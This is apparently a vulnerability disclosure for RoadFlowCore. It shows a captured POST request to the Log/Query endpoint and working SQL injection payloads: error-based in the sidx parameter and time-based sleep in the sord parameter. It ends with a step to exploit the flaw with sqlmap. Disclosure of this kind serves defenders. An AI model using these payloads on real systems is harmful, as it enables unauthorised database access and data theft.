1、Use the default account to log in normally
![image](https://github.com/yangxixx/vulhub/assets/77321474/d4f9c215-11d0-4438-9ee6-03f5eb6db66e)
2、Click log query, use burpsuite to capture packets
![image](https://github.com/yangxixx/vulhub/assets/77321474/670d14ce-b2ff-4ae2-bae9-1628ddda29a8)
![image](https://github.com/yangxixx/vulhub/assets/77321474/a19ee1a0-ccfa-496e-9ce8-7003e4e17f71)
3、package：
POST /RoadFlowCore/Log/Query?appid=0B736354-9473-4D66-B9C0-15CAC149EB05&tabid=tab_0B73635494734D66B9C015CAC149EB05 HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 116
Origin: http://127.0.0.1:5000
Connection: close
Referer: http://127.0.0.1:5000/RoadFlowCore/Log/Index?appid=0B736354-9473-4D66-B9C0-15CAC149EB05&rf_appopenmodel=0&tabid=tab_0B73635494734D66B9C015CAC149EB05
Cookie: rf_login_uniqueid=C9965CEC-493C-4433-8F81-84267ECAF9BD; rf_core_rootdir=; usermenutype=1; rf_core_theme=blue; roadflowcorepagesize=15; RoadFlowCore.Session=CfDJ8EvfmoetFvtFn34qbL0bhQi732bT78siA0k9IyuNV7izzD2HaiCszYysIMm3IHL9tKRQYFo3z2VcOb%2Ba7grHTmnatCG6w2h3Ve0ZUYoFBB%2Fnug6MXcNvN6CJrON40GKlvi5uELoiS8mWsxVTkmR1Bpe%2Fn2KtT%2FGnfrgDuJSlMd8T; .AspNetCore.Antiforgery.SqRQVSlQWbo=CfDJ8EvfmoetFvtFn34qbL0bhQiNLjtoCHp8DTQQSTvj4Wzi3rHnvueNRx4iL7I9mxKb1WgacCXdIFkCxyXh520nuIsS3_NqXifucqHDrhneFPLFspDzv8GeNY-F9Sr7xbTcCfiEOUKwVDAgHp8tTx5DRJI
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

appid=0B736354-9473-4D66-B9C0-15CAC149EB05&_search=false&nd=1686014077522&rows=20000&page=1&sidx=WriteTime&sord=desc

4、There is an error injection in the sidx parameter of this package, replace the value of sidx "extractvalue%281%2Cconcat%28char%28126%29%2Cmd5%281205948442%29%29%29"，Successfully broke the md5 value.
![image](https://github.com/yangxixx/vulhub/assets/77321474/3ee1bd4e-b4c8-4b20-8c18-b012582c945c)
5、There is time injection in the sord parameter of this package, replace the value of sord with "desc%2C%28select%2Afrom%28select%2Bsleep%2810%29union%2F%2A%2A%2Fselect%2B1%29a%29"，Successfully delayed by 10 seconds.
![image](https://github.com/yangxixx/vulhub/assets/77321474/1c7f840f-be87-41a3-9f10-104b66bdb641)
6、Use the sqlmap tool to exploit.
![image](https://github.com/yangxixx/vulhub/assets/77321474/e4bd554b-3d67-4ad6-8100-c53a76c9abdc)
![image](https://github.com/yangxixx/vulhub/assets/77321474/8b6734bc-e48a-4788-a751-d2f8f208336b)

